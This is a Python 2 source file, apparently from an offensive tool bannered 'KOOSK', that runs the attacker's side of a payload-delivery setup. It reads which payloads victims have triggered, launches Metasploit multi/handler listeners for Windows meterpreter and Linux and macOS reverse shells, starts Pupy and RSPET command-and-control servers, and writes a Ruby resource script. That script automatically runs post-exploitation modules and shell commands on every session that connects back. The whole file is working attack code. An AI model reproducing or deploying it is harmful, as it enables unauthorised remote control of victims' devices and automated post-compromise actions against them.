#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2017, Carlos Polop Martin <carlospolop[at]gmail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import subprocess
import time
import re
import sys
from config_paths import *

moves_path = main_path+"moves.txt"

def create_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)

def payloads():
    payloads = {}
    f = open(payloads_path,'r')
    try:
        for line in f:
            linea = line.split(" ")
            if linea[1]:
                payloads[linea[0].strip()] = linea[1].strip()
    except:
        print("Payloads file does not exist: "+payloads_path)
    finally:
        f.close()
        return payloads

def moves_read():
    payloads_called = []
    f = open(moves_path,'r')
    for line in f:
        payloads_called.append(line.strip())
    f.close()
    f = open(moves_path,'w')
    f.close()
    return payloads_called

def read_file(path):
    lines = []
    f = open(path,'r')
    for line in f:
        lines.append(line.strip())
    f.close()
    return lines

def handler(payload):
    print " :: PAYLOAD CALLED: "+payload
    if "msf" in payload:
        rm1 = re.search(r'^/\w+/\w+/',payload).group()
        rm2 = re.search(r'\.\w*$',payload).group()
        metasploit_payload = payload.replace(rm1,"")
        metasploit_payload = metasploit_payload.replace(rm2,"")
        print "MSFCONSOLE: "+metasploit_payload
        msfconsole(metasploit_payload)

    elif "unicorn" in payload:
        rm1 = re.search(r'^/\w+/\w+/',payload).group()
        rm2 = re.search(r'\.\w*$',payload).group()
        metasploit_payload = payload.replace(rm1,"")
        metasploit_payload = metasploit_payload.replace(rm2,"")
        print "UNICORN: "+metasploit_payload
        msfconsole(metasploit_payload)

    elif "BDF" in payload:
        if "exe" in payload:
            msfconsole("windows/meterpreter/reverse_tcp")
        elif "linux" in payload:
            msfconsole("linux/x86/shell/reverse_tcp")
        elif "mac" in payload:
            msfconsole("osx/x64/shell_reverse_tcp")

    elif "pupy" in payload:
        pupy_console()

    elif "rspet" in payload:
        rspet_console()

    else:
        print ("Unknown handler for: "+payload)

def rspet_console():
    print "Running RSPET server"
    rspetserver_path = rspet_path + "Server"
    comando = "cd "+rspetserver_path+"; python ./rspet_server.py"
    print comando
    os.system("gnome-terminal -e 'bash -c \""+comando+"; exec bash\"' 2> /dev/null")

def pupy_console():
    print "Running Pupy server"
    pupyserver_path = pupy_path + "pupy/"
    comando = "cd "+pupyserver_path+"; python ./pupysh.py"
    print comando
    os.system("gnome-terminal -e 'bash -c \""+comando+"; exec bash\"' 2> /dev/null")

def msfconsole(payload):
    dic_payloads = payloads()
    try:
        lport = dic_payloads[payload]
        try:
            path_rc = create_rc(payload, lport)
            print "RC path: "+path_rc
            comando = "msfconsole -r "+path_rc
            os.system("gnome-terminal -e 'bash -c \""+comando+"; exec bash\"' 2> /dev/null")
        except:
            print "There were problems creating the rc file"
    except:
        print "ERROR doesn't exist the payload: "+payload

def meterpreter_rc(meterpreter_path):
    #print "Meterpreter: "+meterpreter_path
    meterpreter_cmds = ""
    for meter_cmd in read_file(meterpreter_path):
        meterpreter_cmds += "s.console.run_single('"+meter_cmd+"')\n\t\t\t"
    return meterpreter_cmds

def post_rc(post_path):
    #print "Post Modules: "+post_path
    post_modules = ""
    for post_module in read_file(post_path):
        post_modules += "run_post(sid,'"+post_module+"')\n\t\t\tprint_status('Ejecutando Post: "+post_module+"')\n\t\t\t"
    return post_modules

def shell_rc(shell_path):
    #print "Shell Commands: "+shell_path
    shell_cmds = ""
    for cmd in read_file(shell_path):
        shell_cmds += "ex_cmd(sid.to_i,'"+cmd+"')\n\t\t\t"
    return shell_cmds

def create_rc(payload, lport):
    date = str(time.strftime("%d-%m-%y_%H:%M"))
    payload_name = re.search(r'\w+$', payload).group()
    path_rc = var_path + "rc/" + payload_name + date + ".rc"
    path_ruby = var_path + "ruby/" + payload_name + date + ".mrb"

    handler_options = ["use exploit/multi/handler", "set PAYLOAD "+payload, "set LHOST "+LHOST, "set LPORT "+lport, "set ExitOnSession false", "run -j -z", "resource " + path_ruby]
    str_options = "\n".join(handler_options)
    f = open(path_rc,'w')
    f.write(str_options)
    f.close()

    #Path POST files
    win_config_path = config_path+"windows/"
    lin_config_path = config_path+"linux/"
    osx_config_path = config_path+"macos/"
    android_config_path = config_path+"android/"
    meterpreter_file = "meterpreter.txt"
    shell_file = "shell.txt"
    post_file = "post.txt"
    create_directory(win_config_path)
    create_directory(lin_config_path)
    create_directory(osx_config_path)
    create_directory(android_config_path)

    #  WINDOWS
    meterpreter_path = win_config_path + meterpreter_file
    shell_path = win_config_path + shell_file
    post_path = win_config_path + post_file
    meterpreter_cmds_win = meterpreter_rc(meterpreter_path)
    post_module_win = post_rc(post_path)
    shell_cmds_win = shell_rc(shell_path)
    #  LINUX
    meterpreter_path = lin_config_path + meterpreter_file
    shell_path = lin_config_path + shell_file
    post_path = lin_config_path + post_file
    meterpreter_cmds_lin = meterpreter_rc(meterpreter_path)
    post_module_lin = post_rc(post_path)
    shell_cmds_lin = shell_rc(shell_path)
    #   MACOS
    shell_path = osx_config_path + shell_file
    post_path = osx_config_path + post_file
    post_module_osx = post_rc(post_path)
    shell_cmds_osx = shell_rc(shell_path)
    # Android
    meterpreter_path = android_config_path + meterpreter_file
    shell_path = android_config_path + shell_file
    post_path = android_config_path + post_file
    meterpreter_cmds_android = meterpreter_rc(meterpreter_path)
    post_module_android = post_rc(post_path)
    shell_cmds_android = shell_rc(shell_path)

    #print "All Meterpreters, Post and Shells files created."

    ruby_rc = '\n<ruby>\n\
    def run_post(session, mod)#, opts)\n\
      m = framework.post.create(mod)\n\
      begin\n\
          m.datastore["SESSION"] = session.to_i\n\
          #opts.each do |o,v|\n\
            #m.datastore[o] = v\n\
          # Validate the Options\n\
          m.options.validate(m.datastore)\n\
          print_status("Running "+mod.to_s+" against "+session.to_s)\n\
          # Execute the Post Module\n\
          m.run_simple("LocalOutput"  => Rex::Ui::Text::Output::Stdio.new)\n\
      rescue\n\
        print_error("Could not run post module against sessions "+session.to_s)\n\
      end\n\
    end\n\
    def ex_cmd(s_int, cmd)\n\
        s = framework.sessions[s_int]\n\
        cmd_out = s.shell_command_token(cmd)\n\
        if not cmd_out.nil?\n\
            cmd_out.each_line do |l|\n\
                print_line(l.chomp)\n\
            end\n\
        end\n\
    end\n\
	sleep(1)\n\
    sessions_hack = [] \n\
	print_status("Waiting on an incoming sessions...")\n\
	while (true)\n\
		framework.sessions.each_pair do |sid,s|\n\
            if !sessions_hack.include?(sid)\n\
                sleep(1)\n\
                if s.platform.include?("win")\n\
                    print_status("It is a WINDOWS")\n\
                    print_status("----- Executing Post modules -----")\n\
                    '+post_module_win+'\n\
                    if (s.type == "meterpreter")\n\
                        print_status("It is a Meterpreter session!!")\n\
                        print_status("----- Executing Meterpreter commands -----")\n\
                          '+meterpreter_cmds_win+'\n\
                    end\n\
                    print_status("----- Executing Shell Commands -----")\n\
                    '+shell_cmds_win+'\n\
    \
                elsif s.platform.include?("android")\n\
                    print_status("It is an ANDROID")\n\
                    print_status("----- Executing Post modules -----")\n\
                    '+post_module_android+'\n\
                    if (s.type == "meterpreter")\n\
                        print_status("It is a Meterpreter session!!")\n\
                        print_status("----- Executing Meterpreter commands -----")\n\
                          '+meterpreter_cmds_android+'\n\
                    end\n\
                    print_status("----- Executing Shell Commands -----")\n\
                    '+shell_cmds_android+'\n\
\
                elsif s.platform.include?("lin")\n\
                    print_status("It is a Linux")\n\
                    print_status("----- Executing Post modules -----")\n\
                    '+post_module_lin+'\n\
                    if (s.type == "meterpreter")\n\
                        print_status("It is a Meterpreter session!!")\n\
                        print_status("----- Executing Meterpreter commands -----")\n\
                          '+meterpreter_cmds_lin+'\n\
                    end\n\
                    print_status("----- Executing Shell Commands -----")\n\
                    '+shell_cmds_lin+'\n\
    \
                elsif s.platform.include?("osx")\n\
                    print_status("It is a MacOS")\n\
                    print_status("----- Executing Post modules -----")\n\
                    '+post_module_osx+'\n\
                    print_status("----- Executing Shell Commands -----")\n\
                    '+shell_cmds_osx+'\n\
                end\n\
    \
                sessions_hack.push(sid.to_i)\n\
            end\n\
        end\n\
		sleep(1)\n\
	end\n\
\n\
    </ruby>\n'

    f = open(path_ruby,'w')
    f.write(ruby_rc)
    f.close()
    print "Files RC and Ruby created!"
    return path_rc


def create_file(path):
    if not os.path.exists(path):
        f = open(path,'w')
        f.close()


def start_service(service):
    try:
        cmd = "service "+service+" start"
        print cmd
        subprocess.check_output(cmd, shell=True)
    except subprocess.CalledProcessError as e:
        print "FAIL starting service: "+service


###############
## MAIN PART ##
###############
print ">=>   >=>         >>           >===>        >=>>=>   >=>   >=>"
print ">=>  >=>         >>=>        >=>    >=>   >=>    >=> >=>  >=>"
print ">=> >=>         >> >=>     >=>        >=>  >=>       >=> >=>     "
print ">>=>>          >=>  >=>    >=>        >=>    >=>     >>=>>       "
print ">=>  >=>      >=====>>=>   >=>        >=>       >=>  >=>  >=>    "
print ">=>   >=>    >=>      >=>    >=>     >=>  >=>    >=> >=>   >=>   "
print ">=>     >=> >=>        >=>     >===>        >=>>=>   >=>     >=> "
print ""

if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

os.system("chown www-data -R "+main_path)

start_service("apache2")
start_service("postgresql")
create_file(moves_path)

print "Lets going to run a metasploit console so the next one will start faster"
comando = "msfconsole"
os.system("gnome-terminal -e 'bash -c \""+comando+"; exec bash\"' 2> /dev/null")
print "Listening..."
while True:
    handle_payloads = moves_read()
    for payload in handle_payloads:
        handler(payload.strip())
    time.sleep(0.5)
